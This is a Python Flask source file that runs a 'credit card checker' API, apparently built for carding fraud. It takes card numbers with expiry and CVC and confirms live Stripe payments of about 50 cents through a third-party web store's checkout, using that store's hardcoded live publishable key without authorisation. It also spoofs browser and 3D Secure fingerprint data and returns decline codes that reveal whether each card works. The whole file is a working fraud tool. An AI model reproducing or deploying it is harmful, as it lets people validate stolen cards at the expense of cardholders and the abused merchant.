from flask import Flask, request, jsonify
import requests
import json

app = Flask(__name__)

# Define URLs
PAYMENT_INTENT_URL = "https://api.stripe.com/v1/payment_intents"
THREEDS_AUTHENTICATE_URL = "https://api.stripe.com/v1/3ds2/authenticate"

# Define common headers
COMMON_HEADERS = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML; Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    'Accept': "application/json",
    'Content-Type': "application/x-www-form-urlencoded",
    'origin': "https://js.stripe.com",
    'sec-fetch-site': "same-site",
    'sec-fetch-mode': "cors",
    'referer': "https://js.stripe.com/"
}

def confirm_payment_intent_with_payment_method(client_secret, card_details, public_key):
    try:
        card_info = card_details.split('|')
        card_number = card_info[0]
        exp_month = card_info[1]
        exp_year = card_info[2]
        cvc = card_info[3]

        url = f"{PAYMENT_INTENT_URL}/{client_secret.split('_secret_')[0]}/confirm"
        payload = {
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_number,
            "payment_method_data[card][exp_year]": exp_year,
            "payment_method_data[card][exp_month]": exp_month,
            "payment_method_data[card][cvc]": cvc,
            "payment_method_data[billing_details][address][country]": "IN",
            "key": public_key,
            "client_secret": client_secret
        }

        headers = COMMON_HEADERS

        response = requests.post(url, data=payload, headers=headers)
        return response.json()
    except Exception as e:
        return {'error': str(e)}

def authenticate_3ds(source, client_secret, public_key):
    try:
        payload = {
            "source": source,
            "browser": json.dumps({
                "fingerprintAttempted": True,
                "fingerprintData": None,
                "challengeWindowSize": None,
                "threeDSCompInd": "Y",
                "browserJavaEnabled": True,
                "browserJavascriptEnabled": True,
                "browserLanguage": "en-US",
                "browserColorDepth": "24",
                "browserScreenHeight": "800",
                "browserScreenWidth": "360",
                "browserTZ": "-330",
                "browserUserAgent": COMMON_HEADERS['User-Agent']
            }),
            "one_click_authn_device_support[hosted]": False,
            "one_click_authn_device_support[same_origin_frame]": False,
            "one_click_authn_device_support[spc_eligible]": False,
            "one_click_authn_device_support[webauthn_eligible]": False,
            "one_click_authn_device_support[publickey_credentials_get_allowed]": True,
            "key": public_key
        }
        
        response = requests.post(THREEDS_AUTHENTICATE_URL, data=payload, headers=COMMON_HEADERS)
        return response.json()
    except Exception as e:
        return {'error': str(e)}

def confirm_payment_intent_after_3ds(payment_intent_id, client_secret, public_key):
    try:
        url = f"{PAYMENT_INTENT_URL}/{payment_intent_id}"
        params = {
            'key': public_key,
            'client_secret': client_secret
        }

        response = requests.get(url, params=params, headers=COMMON_HEADERS)
        return response.json()
    except Exception as e:
        return {'error': str(e)}

def format_response(response):
    try:
        if 'error' in response:
            important_info = {
                "error": {
                    "charge": response['error'].get("charge"),
                    "code": response['error'].get("code"),
                    "decline_code": response['error'].get("decline_code"),
                    "message": response['error'].get("message"),
                    "payment_intent_id": response['error'].get("payment_intent", {}).get("id"),
                    "amount": response['error'].get("payment_intent", {}).get("amount"),
                    "currency": response['error'].get("payment_intent", {}).get("currency"),
                    "created": response['error'].get("payment_intent", {}).get("created"),
                    "status": response['error'].get("payment_intent", {}).get("status")
                }
            }
        else:
            important_info = {
                "id": response.get("id"),
                "status": response.get("status"),
                "amount": response.get("amount"),
                "currency": response.get("currency"),
                "payment_method": response.get("payment_method"),
                "created": response.get("created"),
                "charges": response.get("charges", {}).get("data", [{}])[0].get("outcome", {}).get("seller_message")
            }
        # Check if important_info is filled with data; if not, return raw response
        if all(value is None for value in important_info.values()):
            return {
                "api owned by": "@HRK_07",
                "response": response
            }
        else:
            return {
                "api owned by": "@HRK_07",
                "response": important_info
            }
    except Exception as e:
        return {'error': str(e)}

@app.route('/checker', methods=['GET'])
def checker():
    try:
        amount_usd = request.args.get('amount', default=0.5, type=float)
        amount_cents = int(amount_usd * 100)
        card_details = request.args.get('cc')

        # Create payment intent
        payment_intent_response = create_payment_intent(amount_cents)
        if 'error' in payment_intent_response:
            return jsonify(payment_intent_response), 400

        public_key = payment_intent_response['pk']
        client_secret = payment_intent_response['client_secret']
        
        # Confirm payment intent with CVV
        confirm_response = confirm_payment_intent_with_payment_method(client_secret, card_details, public_key)
        if 'error' in confirm_response:
            return jsonify(format_response(confirm_response)), 400

        final_response = confirm_response
        if confirm_response.get('status') == 'requires_action':
            three_ds_source = confirm_response['next_action']['use_stripe_sdk']['three_d_secure_2_source']
            auth_response = authenticate_3ds(three_ds_source, client_secret, public_key)
            if 'error' in auth_response:
                return jsonify(format_response(auth_response)), 400

            if auth_response.get('state') == 'succeeded':
                final_response = confirm_payment_intent_after_3ds(confirm_response['id'], client_secret, public_key)
                if 'error' in final_response:
                    return jsonify(format_response(final_response)), 400

        return jsonify(format_response(final_response))
    except Exception as e:
        return jsonify({'error': str(e)}), 400

def create_payment_intent(amount_cents):
    url = "https://bytethisstore.com/api/store/payments/create-payment-intent"

    payload = json.dumps({
        "payload": {
            "paymentMethod": "stripe",
            "paymentIntentParams": {
                "amount": amount_cents,
                "currency": "usd"
            }
        },
        "auth": {
            "sessionToken": "",
            "browserInstanceToken": ""
        }
    })

    headers = {
        'User-Agent': COMMON_HEADERS['User-Agent'],
        'Content-Type': "application/json",
        'Response-Type': "application/json",
        'Origin': "https://bytethisstore.com",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Referer': "https://bytethisstore.com/cart/submit-payment/pg(footer:april22)"
    }

    response = requests.post(url, data=payload, headers=headers)
    response_data = response.json()

    client_secret = response_data.get("paymentIntentID", "No paymentIntentID found")
    pk = "pk_live_51InCJ6K6bfhOthAjGY9h90vLfGjAjirBVD779ydB0hben7Ay7vW0t6yhzjcNMoft6s2REcUFlV3ZWB5wddaCh8kM00ZccjezR3"

    return {
        "client_secret": client_secret,
        "pk": pk
    }

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
    
